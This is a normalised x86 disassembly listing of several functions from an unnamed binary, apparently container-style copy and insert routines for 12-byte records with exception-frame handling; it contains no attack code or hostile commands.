mov ecx rw-data
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4826f8
cmp eax 0x7
lea eax [ ebp - 0xc ]
sete dl
and edx 0x1
push edx
mov edx 0x2
dec [ ebp - 0x14 ]
call sub_4d318c
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
je r-xdata
sub_417dfc
push ebp
mov ebp esp
add esp 0xfffffed4
push ebx
push esi
push edi
mov [ ebp - 0x44 ] edx
mov esi eax
mov eax rw-data
call sub_4c517c
mov ebx [ rw-data ]
add ebx 0x8
mov eax [ ebx + 0x14 ]
mov [ ebp - 0xb4 ] eax
mov eax [ ebx + 0x10 ]
mov [ ebp - 0xc4 ] eax
mov edx [ ebp - 0xb4 ]
mov ecx [ ebp - 0xc4 ]
cmp edx ecx
setne al
and eax 0x1
test al al
je r-xdata
mov ecx [ ebp - 0xcc ]
mov [ ebp - 0xdc ] ecx
mov ecx [ ebp - 0xc8 ]
mov [ ebp - 0xd8 ] ecx
mov eax [ ebp - 0xc4 ]
mov [ ebp - 0xd4 ] eax
xor edx edx
mov [ ebp - 0x80 ] edx
jmp r-xdata
mov edx [ ebp - 0xc4 ]
mov [ ebp - 0x48 ] edx
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0x4c ] ecx
lea ecx [ ebp - 0x58 ]
mov eax [ ebp - 0xb4 ]
mov [ ebp - 0x50 ] eax
mov edx [ ebp - 0x60 ]
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x5c ]
mov [ ebp - 0x54 ] edx
push [ ecx + 0x4 ]
push [ ecx ]
mov edx [ ebp - 0x48 ]
push edx
mov ecx [ ebp - 0x4c ]
push ecx
mov eax [ ebp - 0x50 ]
push eax
call sub_4182a8
mov edi eax
mov eax [ ebx + 0x14 ]
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x68 ] edi
lea edx [ ebx + 0x8 ]
lea eax [ ebp - 0x74 ]
mov [ ebp - 0x6c ] edx
add esp 0x14
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0x74 ] ecx
mov ecx [ ebp - 0x78 ]
mov [ ebp - 0x70 ] ecx
push [ eax + 0x4 ]
push [ eax ]
mov ecx [ ebp - 0x6c ]
push ecx
mov eax [ ebp - 0x64 ]
push eax
mov edx [ ebp - 0x68 ]
push edx
call sub_406ae0
add esp 0x14
mov [ ebx + 0x14 ] edi
mov ecx [ esi + 0x378 ]
mov eax [ ecx + 0x28c ]
call sub_4a81b8
mov edx [ ebp - 0x80 ]
cmp eax edx
jg r-xdata
mov ecx [ esi + 0x378 ]
mov edx [ ebp - 0x80 ]
mov eax [ ecx + 0x28c ]
call sub_4a81f0
mov ebx eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x30 ] 0x18
lea edx [ ebx + 0x20 ]
call sub_4d3050
inc [ ebp - 0x24 ]
xor edx edx
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x30 ] 0x24
mov [ ebp - 0x8 ] edx
lea eax [ ebx + 0x8 ]
inc [ ebp - 0x24 ]
xor edx edx
mov eax [ eax ]
lea ecx [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x30 ] 0x30
lea eax [ ebx + 0x8 ]
xor edx edx
mov [ ebp - 0xc ] edx
lea ecx [ ebp - 0xc ]
inc [ ebp - 0x24 ]
mov eax [ eax ]
mov edx 0x1
mov ebx [ eax ]
call [ ebx + 0xc ]
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x30 ] 0x3c
mov eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
push ecx
lea eax [ ebp - 0x18 ]
push eax
call sub_41b864
add [ ebp - 0x24 ] 0x4
mov ebx [ rw-data ]
mov edi eax
add ebx 0x8
add esp 0x10
mov eax [ ebx + 0x10 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x398 ]
mov edx [ eax ]
call [ edx + 0xdc ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0x10 ]
sub eax edx
mov ecx 0xc
cdq
idiv ecx
mov ecx eax
xor ecx ecx
jmp r-xdata
mov eax [ esi + 0x394 ]
mov edx [ eax ]
call [ edx + 0xdc ]
test al al
je r-xdata
mov ecx [ rw-data ]
xor eax eax
mov [ ecx ] eax
jmp r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ ebx + 0x10 ]
sub eax edx
push ecx
mov ecx 0xc
cdq
idiv ecx
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x39c ]
mov edx [ eax ]
call [ edx + 0xdc ]
test al al
je r-xdata
mov ecx [ rw-data ]
mov [ ecx ] 0x1
jmp r-xdata
mov [ ebp - 0x30 ] 0x48
mov eax [ esi + 0x3a0 ]
mov ebx [ esi + 0x3a0 ]
add ebx 0x29c
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx eax
xor eax eax
mov [ ebp - 0x1c ] eax
lea ecx [ ebp - 0x1c ]
inc [ ebp - 0x24 ]
mov eax [ ebx ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
add eax 0x4
call sub_4d31b4
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
mov ecx [ rw-data ]
push ecx
call sub_41b168
pop ecx
mov eax esi
call sub_47dde4
mov edx [ ebp - 0x40 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x14 ]
mov [ ebp - 0x9c ] eax
mov edx [ ebp - 0x9c ]
mov [ ebp - 0xe4 ] edx
mov ecx [ ebx + 0x10 ]
test ecx ecx
jne r-xdata
mov eax [ ebx + 0x14 ]
lea ecx [ ebx + 0x8 ]
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x88 ] ecx
mov eax [ ebp - 0x98 ]
lea edx [ ebp - 0x90 ]
mov [ ebp - 0x90 ] eax
mov eax [ ebp - 0x94 ]
mov [ ebp - 0x8c ] eax
push [ edx + 0x4 ]
push [ edx ]
mov eax [ ebp - 0x88 ]
push eax
push edi
push 0x1
mov edx [ ebp - 0x84 ]
push edx
call sub_4182f0
add esp 0x18
mov ecx [ ebp - 0x84 ]
add ecx 0xc
mov [ ebx + 0x14 ] ecx
jmp r-xdata
cmp ecx edx
jae r-xdata
mov ecx [ rw-data ]
mov [ ecx ] 0x2
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0x10 ]
sub eax edx
mov ecx 0xc
cdq
idiv ecx
xor eax eax
jmp r-xdata
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x24 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x30 ] 0x0
inc [ ebp - 0x80 ]
mov eax [ ebx + 0x10 ]
mov [ ebp - 0xa4 ] eax
mov edx [ ebp - 0xa4 ]
mov [ ebp - 0xf4 ] edx
mov eax [ ebp - 0xe4 ]
mov edx [ ebp - 0xf4 ]
sub eax edx
mov ecx 0xc
cdq
idiv ecx
xor eax eax
jmp r-xdata
test eax eax
jne r-xdata
mov [ ebp - 0xa0 ] eax
push edi
push 0x1
add esp 0xfffffff0
mov eax [ ebp - 0xec ]
mov [ esp ] eax
mov eax [ ebp - 0xe8 ]
mov [ esp + 0x4 ] eax
mov eax [ ebp - 0xe4 ]
mov [ esp + 0x8 ] eax
push ebx
call sub_418418
add esp 0x1c
mov edx [ ebp - 0xa0 ]
mov [ ebp - 0xa8 ] edx
mov ecx [ ebx + 0x10 ]
mov [ ebp - 0xac ] ecx
mov eax [ ebp - 0xac ]
mov [ ebp - 0x104 ] eax
mov edx [ ebp - 0x10c ]
mov [ ebp - 0x11c ] edx
mov edx [ ebp - 0x108 ]
mov [ ebp - 0x118 ] edx
mov ecx [ ebp - 0x104 ]
mov [ ebp - 0x114 ] ecx
mov eax [ ebp - 0xa8 ]
shl eax 0x2
lea eax [ eax + eax * 2 ]
add [ ebp - 0x114 ] eax
mov edx [ ebp - 0x11c ]
mov [ ebp - 0x12c ] edx
mov edx [ ebp - 0x118 ]
mov [ ebp - 0x128 ] edx
mov ecx [ ebp - 0x114 ]
mov [ ebp - 0x124 ] ecx
sub_4182a8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp edi eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi edi
mov eax ebx
mov edx esi
call sub_4d31b4
lea edx [ esi + 0x4 ]
lea eax [ ebx + 0x4 ]
call sub_4d31b4
lea edx [ esi + 0x8 ]
lea eax [ ebx + 0x8 ]
call sub_4d31b4
add ebx 0xc
add edi 0xc
mov ecx [ ebp + 0xc ]
cmp edi ecx
jne r-xdata
sub_4182f0
push ebp
mov ebp esp
add esp 0xffffffd0
mov eax rw-data
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
call sub_4c517c
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x1c ] 0xc
test esi esi
jbe r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov edi eax
push edi
push 0xc
call sub_415614
add esp 0x8
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec esi
add [ ebp + 0x8 ] 0xc
test esi esi
ja r-xdata
mov [ ebp - 0x1c ] 0x30
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4d3050
inc [ ebp - 0x10 ]
lea edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
add eax 0x4
call sub_4d3050
inc [ ebp - 0x10 ]
lea edx [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
add eax 0x8
call sub_4d3050
inc [ ebp - 0x10 ]
add [ ebp - 0x10 ] 0xfffffffd
mov [ ebp - 0x1c ] 0x18
sub_418383
mov edx [ ebp - 0x30 ]
mov ecx [ ebp + 0x8 ]
cmp edx ecx
je r-xdata
push 0x0
push 0x0
call sub_4d1c58
add esp 0x8
mov [ ebp - 0x1c ] 0x14
call sub_4d1d58
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
add [ ebp - 0x30 ] 0xc
mov ecx [ ebp - 0x30 ]
mov eax [ ebp + 0x8 ]
cmp ecx eax
jne r-xdata
dec [ ebp - 0x10 ]
mov edx 0x2
mov [ ebp - 0x1c ] 0x60
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
add eax 0x8
call sub_4d318c
dec [ ebp - 0x10 ]
mov edx 0x2
mov eax [ ebp - 0x8 ]
add eax 0x4
call sub_4d318c
dec [ ebp - 0x10 ]
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_4d318c
mov [ ebp - 0x1c ] 0x48
sub_418418
push ebp
mov ebp esp
add esp 0xfffffcc4
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x20 ]
call sub_4c517c
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x10 ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x10 ]
sub eax ecx
mov ecx 0xc
cdq
idiv ecx
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x94 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
call sub_419954
mov edx [ ebp + 0x8 ]
pop ecx
mov ecx eax
mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
mov [ ebp - 0x98 ] eax
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov esi 0xc
mov edx [ edx + 0x10 ]
mov eax [ eax + 0x14 ]
sub eax edx
cdq
idiv esi
mov edx eax
xor edx edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x10 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x94 ]
lea eax [ ebp - 0xa0 ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
mov [ ebp - 0x84 ] 0x18
push eax
call sub_408628
pop ecx
lea edx [ ebp - 0xa0 ]
push edx
lea ecx [ ebp - 0x50 ]
push ecx
call sub_408650
add esp 0x8
mov eax 0xf
mov [ ebp - 0x34 ] eax
mov [ ebp - 0xa1 ] 0x0
mov edx [ ebp - 0x34 ]
cmp edx 0x10
jb r-xdata
sub ecx edx
mov eax [ ebp + 0x1c ]
cmp ecx eax
jae r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x10 ]
sub eax ecx
mov ecx 0xc
cdq
idiv ecx
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x48 ]
mov ecx [ ebp - 0x48 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov edx [ ebp + 0x14 ]
sub eax edx
mov ecx 0xc
cdq
idiv ecx
mov edx [ ebp + 0x1c ]
cmp eax edx
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
call sub_419954
pop ecx
mov edx [ ebp - 0x98 ]
shr edx 0x1
sub eax edx
mov ecx [ ebp - 0x98 ]
cmp eax ecx
jae r-xdata
mov edx [ ebp + 0x1c ]
add eax edx
mov ecx [ ebp - 0x98 ]
cmp eax ecx
jbe r-xdata
xor edx edx
jmp r-xdata
mov edx rw-data
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
add ecx eax
mov [ ebp - 0xa8 ] ecx
mov edx [ ebp - 0xa8 ]
mov cl [ ebp - 0xa1 ]
mov [ edx ] cl
push rw-data
call sub_4c4e7c
pop ecx
mov ebx eax
mov eax rw-data
test eax eax
je r-xdata
mov [ ebp - 0x84 ] 0x90
mov [ ebp - 0x2fc ] ebx
lea eax [ ebp - 0x70 ]
mov edx [ ebp - 0x2fc ]
call sub_4d3050
inc [ ebp - 0x78 ]
lea eax [ ebp - 0x6c ]
mov edx [ ebp - 0x2fc ]
add edx 0x4
call sub_4d3050
inc [ ebp - 0x78 ]
lea eax [ ebp - 0x68 ]
mov edx [ ebp - 0x2fc ]
add edx 0x8
call sub_4d3050
inc [ ebp - 0x78 ]
inc [ ebp - 0x78 ]
mov [ ebp - 0x84 ] 0x84
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x14 ]
mov [ ebp - 0x300 ] eax
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x14 ]
mov [ ebp - 0x304 ] ecx
mov eax [ ebp - 0x300 ]
mov [ ebp - 0x308 ] eax
mov edx [ ebp + 0x1c ]
mov ecx [ ebp - 0x300 ]
shl edx 0x2
lea edx [ edx + edx * 2 ]
sub ecx edx
mov [ ebp - 0x30c ] ecx
lea ecx [ ebp - 0x318 ]
mov eax [ ebp + 0x8 ]
add eax 0x8
mov [ ebp - 0x310 ] eax
mov edx [ ebp - 0x320 ]
mov [ ebp - 0x318 ] edx
mov edx [ ebp - 0x31c ]
mov [ ebp - 0x314 ] edx
push [ ecx + 0x4 ]
push [ ecx ]
mov edx [ ebp - 0x310 ]
push edx
mov ecx [ ebp - 0x304 ]
push ecx
mov eax [ ebp - 0x308 ]
push eax
mov edx [ ebp - 0x30c ]
push edx
call sub_419980
mov ecx [ ebp + 0x8 ]
add esp 0x18
mov [ ecx + 0x14 ] eax
mov eax [ ebp - 0x300 ]
mov [ ebp - 0x324 ] eax
mov edx [ ebp + 0x1c ]
mov ecx [ ebp - 0x300 ]
shl edx 0x2
lea edx [ edx + edx * 2 ]
sub ecx edx
mov [ ebp - 0x328 ] ecx
lea ecx [ ebp - 0x334 ]
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x32c ] eax
mov edx [ ebp - 0x33c ]
mov [ ebp - 0x334 ] edx
mov edx [ ebp - 0x338 ]
mov [ ebp - 0x330 ] edx
push [ ecx + 0x4 ]
push [ ecx ]
mov edx [ ebp - 0x324 ]
push edx
mov ecx [ ebp - 0x328 ]
push ecx
mov eax [ ebp - 0x32c ]
push eax
call sub_419af0
add esp 0x14
lea edx [ ebp - 0x70 ]
push edx
mov ecx [ ebp + 0x1c ]
shl ecx 0x2
lea ecx [ ecx + ecx * 2 ]
mov eax [ ebp + 0x14 ]
add ecx eax
push ecx
mov edx [ ebp + 0x14 ]
push edx
call sub_419ab0
add esp 0xc
dec [ ebp - 0x78 ]
dec [ ebp - 0x78 ]
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x78 ]
lea eax [ ebp - 0x6c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x78 ]
lea eax [ ebp - 0x70 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x84 ] 0x0
mov [ ebp - 0x84 ] 0x60
mov [ ebp - 0x2a0 ] ebx
lea eax [ ebp - 0x64 ]
mov edx [ ebp - 0x2a0 ]
call sub_4d3050
inc [ ebp - 0x78 ]
lea eax [ ebp - 0x60 ]
mov edx [ ebp - 0x2a0 ]
add edx 0x4
call sub_4d3050
inc [ ebp - 0x78 ]
lea eax [ ebp - 0x5c ]
mov edx [ ebp - 0x2a0 ]
add edx 0x8
call sub_4d3050
inc [ ebp - 0x78 ]
inc [ ebp - 0x78 ]
mov [ ebp - 0x84 ] 0x54
mov ecx [ ebp + 0x1c ]
mov eax [ ebp + 0x14 ]
shl ecx 0x2
lea ecx [ ecx + ecx * 2 ]
add ecx eax
mov [ ebp - 0x2a4 ] ecx
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x14 ]
mov [ ebp - 0x2a8 ] ecx
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x2ac ] eax
lea eax [ ebp - 0x2b8 ]
mov edx [ ebp + 0x8 ]
add edx 0x8
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x2c0 ]
mov [ ebp - 0x2b8 ] ecx
mov ecx [ ebp - 0x2bc ]
mov [ ebp - 0x2b4 ] ecx
push [ eax + 0x4 ]
push [ eax ]
mov ecx [ ebp - 0x2b0 ]
push ecx
mov eax [ ebp - 0x2a4 ]
push eax
mov edx [ ebp - 0x2a8 ]
push edx
mov ecx [ ebp - 0x2ac ]
push ecx
call sub_419980
mov [ ebp - 0x84 ] 0x6c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x14 ]
mov ecx 0xc
add esp 0x18
mov eax [ eax + 0x14 ]
sub eax edx
cdq
idiv ecx
mov edx [ ebp + 0x1c ]
sub edx eax
mov [ ebp - 0x2c4 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x2c8 ] ecx
lea ecx [ ebp - 0x2d4 ]
mov eax [ ebp + 0x8 ]
add eax 0x8
mov [ ebp - 0x2cc ] eax
mov edx [ ebp - 0x2dc ]
mov [ ebp - 0x2d4 ] edx
mov edx [ ebp - 0x2d8 ]
mov [ ebp - 0x2d0 ] edx
push [ ecx + 0x4 ]
push [ ecx ]
mov edx [ ebp - 0x2cc ]
lea ecx [ ebp - 0x64 ]
push edx
push ecx
mov eax [ ebp - 0x2c4 ]
push eax
mov edx [ ebp - 0x2c8 ]
push edx
call sub_4182f0
mov [ ebp - 0x84 ] 0x54
add esp 0x18
jmp r-xdata
mov eax [ ebp - 0x98 ]
shr eax 0x1
mov edx [ ebp - 0x98 ]
add eax edx
xor eax eax
jmp r-xdata
test dl dl
je r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov ecx [ ebp + 0x1c ]
mov eax [ ebp + 0x8 ]
shl ecx 0x2
lea edx [ ebp - 0x64 ]
lea ecx [ ecx + ecx * 2 ]
add [ eax + 0x14 ] ecx
push edx
mov edx [ ebp + 0x1c ]
mov ecx [ ebp + 0x8 ]
shl edx 0x2
mov eax [ ecx + 0x14 ]
lea edx [ edx + edx * 2 ]
sub eax edx
push eax
mov ecx [ ebp + 0x14 ]
push ecx
call sub_419ab0
add esp 0xc
dec [ ebp - 0x78 ]
dec [ ebp - 0x78 ]
lea eax [ ebp - 0x5c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x78 ]
lea eax [ ebp - 0x60 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x78 ]
lea eax [ ebp - 0x64 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x84 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x14 ]
mov ecx [ edx + 0x10 ]
sub eax ecx
mov ecx 0xc
cdq
idiv ecx
mov edx eax
xor edx edx
jmp r-xdata
mov [ ebp - 0x98 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x50 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x134 ] eax
mov ecx [ ebp - 0x134 ]
cmp ecx 0x1
ja r-xdata
mov eax rw-data
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
mov edx [ ebp - 0x34 ]
cmp edx 0x10
jb r-xdata
cmp edx eax
jb r-xdata
mov esi [ ebp - 0x98 ]
mov edx esi
shl edx 0x2
lea edx [ edx + edx * 2 ]
push edx
call sub_4bbbac
pop ecx
mov [ ebp - 0x208 ] eax
mov eax [ ebp - 0x208 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x84 ] 0x3c
mov edx [ ebp + 0x8 ]
mov esi [ ebp - 0x208 ]
mov edi [ ebp + 0x14 ]
mov ecx [ edx + 0x10 ]
mov [ ebp - 0x210 ] ecx
lea ecx [ ebp - 0x21c ]
mov eax [ ebp + 0x8 ]
add eax 0x8
mov [ ebp - 0x214 ] eax
mov edx [ ebp - 0x224 ]
mov [ ebp - 0x21c ] edx
mov edx [ ebp - 0x220 ]
mov [ ebp - 0x218 ] edx
push [ ecx + 0x4 ]
push [ ecx ]
mov edx [ ebp - 0x214 ]
push edx
push esi
push edi
mov ecx [ ebp - 0x210 ]
push ecx
call sub_419980
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x228 ] ebx
mov eax [ ebp + 0x8 ]
add esp 0x18
mov esi [ ebp + 0x1c ]
mov edi [ ebp - 0x20c ]
add eax 0x8
lea ecx [ ebp - 0x234 ]
mov [ ebp - 0x22c ] eax
mov edx [ ebp - 0x23c ]
mov [ ebp - 0x234 ] edx
mov edx [ ebp - 0x238 ]
mov [ ebp - 0x230 ] edx
push [ ecx + 0x4 ]
push [ ecx ]
mov edx [ ebp - 0x22c ]
push edx
mov ecx [ ebp - 0x228 ]
push ecx
push esi
push edi
call sub_4182f0
mov eax esi
add esp 0x18
shl eax 0x2
lea eax [ eax + eax * 2 ]
add edi eax
mov [ ebp - 0x20c ] edi
mov edx [ ebp - 0x20c ]
mov [ ebp - 0x240 ] edx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x14 ]
mov [ ebp - 0x244 ] eax
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x248 ] edx
lea edx [ ebp - 0x254 ]
mov ecx [ ebp + 0x8 ]
add ecx 0x8
mov [ ebp - 0x24c ] ecx
mov eax [ ebp - 0x25c ]
mov [ ebp - 0x254 ] eax
mov eax [ ebp - 0x258 ]
mov [ ebp - 0x250 ] eax
push [ edx + 0x4 ]
push [ edx ]
mov eax [ ebp - 0x24c ]
push eax
mov edx [ ebp - 0x240 ]
push edx
mov ecx [ ebp - 0x244 ]
push ecx
mov eax [ ebp - 0x248 ]
push eax
call sub_419980
mov [ ebp - 0x84 ] 0x0
add esp 0x18
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x10 ]
test edx edx
jne r-xdata
mov eax [ ebp + 0x1c ]
add edx eax
mov ecx [ ebp - 0x98 ]
cmp edx ecx
jbe r-xdata
mov eax [ ebp - 0x134 ]
dec eax
mov eax 0x1
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
lea ecx [ ebp - 0x48 ]
mov ecx [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x10 ]
test edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x10 ]
mov eax [ eax + 0x14 ]
sub eax ecx
mov ecx 0xc
cdq
idiv ecx
mov ecx eax
xor ecx ecx
jmp r-xdata
mov ecx [ ebp - 0x34 ]
cmp ebx ecx
jbe r-xdata
lea edx [ ebp - 0x58 ]
push edx
call sub_4bbca8
pop ecx
cmp ebx eax
jbe r-xdata
mov edx [ ebp - 0x38 ]
mov ecx [ ebp - 0xac ]
sub edx ecx
mov [ ebp - 0xb0 ] edx
mov eax [ ebp - 0xb0 ]
cmp ebx eax
jae r-xdata
lea eax [ ebp - 0x58 ]
push eax
call sub_4bc8cc
pop ecx
sub eax edx
mov [ ebp - 0xac ] eax
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0xac ]
cmp eax ecx
jae r-xdata
mov dl 0x1
mov eax [ ebp - 0x38 ]
add ecx eax
cmp ecx rw-data
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x10 ]
mov eax [ eax + 0x14 ]
sub eax ecx
mov ecx 0xc
cdq
idiv ecx
mov ecx eax
xor ecx ecx
jmp r-xdata
mov eax [ ebp + 0x1c ]
add ecx eax
mov [ ebp - 0x98 ] ecx
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ ebp - 0x58 ]
push eax
push ebx
push edx
call sub_408678
add esp 0xc
jmp r-xdata
lea edx [ ebp - 0x58 ]
lea ecx [ ebp - 0x58 ]
cmp edx ecx
jne r-xdata
mov [ ebp - 0xb0 ] ebx
mov ecx [ ebp - 0x98 ]
mov edx [ ebp + 0x8 ]
shl ecx 0x2
mov eax [ ebp - 0x208 ]
lea ecx [ ecx + ecx * 2 ]
add ecx eax
mov [ edx + 0x18 ] ecx
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x8 ]
shl ecx 0x2
mov eax [ ebp - 0x208 ]
lea ecx [ ecx + ecx * 2 ]
add ecx eax
mov [ edx + 0x14 ] ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x208 ]
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0x280 ] edx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
mov [ ebp - 0x284 ] eax
lea eax [ ebp - 0x290 ]
mov edx [ ebp + 0x8 ]
add edx 0x8
mov [ ebp - 0x288 ] edx
mov ecx [ ebp - 0x298 ]
mov [ ebp - 0x290 ] ecx
mov ecx [ ebp - 0x294 ]
mov [ ebp - 0x28c ] ecx
push [ eax + 0x4 ]
push [ eax ]
mov ecx [ ebp - 0x288 ]
push ecx
mov eax [ ebp - 0x280 ]
push eax
mov edx [ ebp - 0x284 ]
push edx
call sub_406ae0
add esp 0x14
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
mov [ ebp - 0x29c ] eax
mov edx [ ebp - 0x29c ]
push edx
call sub_4b0180
pop ecx
add [ ebp + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
test ebx ebx
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x14d ] 0x0
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
mov esi [ ebp - 0xb0 ]
lea eax [ ebp - 0x50 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0xf8 ] eax
mov edx [ ebp - 0xf8 ]
cmp edx 0x1
ja r-xdata
mov [ ebp - 0xb4 ] 0xffffffff
mov eax [ ebp - 0xac ]
mov edx [ ebp - 0xb0 ]
add eax edx
mov [ ebp - 0xb8 ] eax
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0xb8 ]
cmp ecx eax
jae r-xdata
lea eax [ ebp - 0x58 ]
mov edx [ ebp - 0x34 ]
cmp edx 0x10
jb r-xdata
lea edx [ ebp - 0x48 ]
